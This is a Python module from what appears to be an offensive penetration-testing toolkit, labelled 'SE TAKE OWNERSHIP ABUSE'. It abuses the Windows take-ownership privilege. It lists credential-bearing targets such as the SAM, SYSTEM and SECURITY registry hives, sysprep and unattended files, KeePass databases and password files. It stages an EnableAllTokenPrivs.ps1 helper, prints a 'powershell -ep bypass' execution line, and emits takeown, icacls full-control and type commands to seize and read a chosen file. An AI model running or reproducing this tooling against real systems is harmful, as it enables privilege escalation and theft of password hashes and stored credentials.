from pathlib import Path
from core.runner import run_module_by_name

# =========================================================
# COLORS
# =========================================================

G = '\033[92m'
C = '\033[96m'
B = '\033[94m'
Y = '\033[93m'
R = '\033[91m'
W = '\033[0m'
W_BOLD = '\033[1m'

# =========================================================
# PATHS
# =========================================================

BASE_DIR = Path(__file__).resolve().parents[3]

HELPER_SCRIPT = (
    BASE_DIR /
    "exploits" /
    "windows" /
    "ownership" /
    "EnableAllTokenPrivs.ps1"
)

# =========================================================
# TARGETS
# =========================================================

FILES_OF_INTEREST = [

    r"C:\inetpub\wwwroot\web.config",

    r"%WINDIR%\repair\sam",

    r"%WINDIR%\repair\system",

    r"%WINDIR%\repair\software",

    r"%WINDIR%\repair\security",

    r"%WINDIR%\system32\config\SAM",

    r"%WINDIR%\system32\config\SYSTEM",

    r"unattended.xml",

    r"sysprep.xml",

    r"*.kdbx",

    r"passwords.*",

    r"creds.*",
]

# =========================================================
# HELPERS
# =========================================================

def ask_enabled():

    try:

        result = input(
            f"\n{B}enabled? [y/N]{W}> "
        ).strip().lower()

    except (KeyboardInterrupt, EOFError):

        print()

        return False

    return result == "y"


def transfer_helper(data):

    if not HELPER_SCRIPT.exists():

        print(
            f"\n{R}[!] Missing helper script:{W}"
        )

        print(f"  {HELPER_SCRIPT}")

        return

    print(
        f"\n{B}[*]{W} "
        f"STAGING EnableAllTokenPrivs.ps1"
    )

    try:

        run_module_by_name(
            "upload.windows",
            [
                str(HELPER_SCRIPT),
                "EnableAllTokenPrivs.ps1"
            ],
            data,
        )

    except Exception as e:

        print(
            f"\n{R}[!] Transfer failed:{W} {e}"
        )

        return

    print(
        f"\n{G}[+] Helper transferred.{W}"
    )

    print(
        f"\n{Y}"
        f"┌── EXECUTION "
        f"─────────────────────────────────────┐{W}"
    )

    print(
        f"{Y}│{W} "
        f"powershell -ep bypass "
        f"-f EnableAllTokenPrivs.ps1"
    )

    print(
        f"{Y}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


def render_targets():

    print(
        f"\n{B}[*]{W} "
        f"FILES OF INTEREST\n"
    )

    for idx, target in enumerate(FILES_OF_INTEREST):

        connector = (
            "└──"
            if idx == len(FILES_OF_INTEREST)-1
            else "├──"
        )

        print(
            f"  {B}{connector}{W} "
            f"{target}"
        )


def build_commands(target):

    print(
        f"\n{G}"
        f"┌── TAKE OWNERSHIP "
        f"──────────────────────────────────┐{W}"
    )

    print(
        f"{G}│{W} "
        f'takeown /f "{target}"'
    )

    print(
        f"{G}│{W} "
        f'icacls "{target}" /grant %USERNAME%:F'
    )

    print(
        f"{G}│{W} "
        f'type "{target}"'
    )

    print(
        f"{G}"
        f"└──────────────────────────────────────────────────┘{W}"
    )


def render_notes():

    print(
        f"\n{Y}"
        f"┌── NOTES "
        f"─────────────────────────────────────────┐{W}"
    )

    print(
        f"{Y}│{W} "
        f"modifying ownership can be destructive"
    )

    print(
        f"{Y}│{W} "
        f"revert permissions after testing"
    )

    print(
        f"{Y}│{W} "
        f"avoid changing live production configs"
    )

    print(
        f"{Y}"
        f"└──────────────────────────────────────────────────┘{W}"
    )

# =========================================================
# MAIN
# =========================================================

def run(data=None, cred=None, args=None):

    print(
        f"\n{W_BOLD}"
        f"[*] SE TAKE OWNERSHIP ABUSE{W}"
    )

    # =====================================================
    # ENABLED?
    # =====================================================

    enabled = ask_enabled()

    # =====================================================
    # ENABLE PRIV
    # =====================================================

    if not enabled:

        print(
            f"\n{Y}[!] "
            f"Privilege currently disabled.{W}"
        )

        try:

            choice = input(
                f"\n{B}transfer helper script? [Y/n]{W}> "
            ).strip().lower()

        except (KeyboardInterrupt, EOFError):

            print()
            return data

        if not choice or choice == "y":

            transfer_helper(data)

    else:

        print(
            f"\n{G}[+] "
            f"Privilege enabled.{W}"
        )

    # =====================================================
    # TARGETS
    # =====================================================

    render_targets()

    # =====================================================
    # TARGET INPUT
    # =====================================================

    try:

        target = input(
            f"\n{B}target file{W}> "
        ).strip()

    except (KeyboardInterrupt, EOFError):

        print()
        return data

    if not target:

        return data

    # =====================================================
    # COMMANDS
    # =====================================================

    build_commands(target)

    render_notes()

    return data
